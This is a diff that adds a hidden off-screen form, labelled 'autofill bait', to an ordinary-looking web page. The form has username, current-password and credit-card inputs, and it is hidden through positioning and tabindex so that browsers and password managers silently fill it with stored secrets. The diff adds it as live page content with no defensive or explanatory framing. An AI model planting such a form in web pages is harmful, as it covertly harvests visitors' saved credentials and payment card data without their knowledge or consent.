@@ -22,6 +22,21 @@
 <body>
 
 
+ 
+<!-- AUTOFILL BAIT (off-screen) -->
+<form id="autofill-bait"
+      autocomplete="off"
+      style="position:absolute; left:-9999px; width:1px; height:1px; overflow:hidden; pointer-events:none;">
+  <!-- password managers/browsers tend to fill first visible inputs with known tokens -->
+  <input autocomplete="username" type="text" tabindex="-1" />
+  <input autocomplete="current-password" type="password" tabindex="-1" />
+  <!-- credit-card hints (optional) -->
+  <input autocomplete="cc-name" type="text" tabindex="-1" />
+  <input autocomplete="cc-number" type="text" tabindex="-1" />
+  <input autocomplete="cc-exp" type="text" tabindex="-1" />
+  <input autocomplete="cc-csc" type="text" tabindex="-1" />
+</form>
+
     
 <!-- 
 <div class="icon-grid">
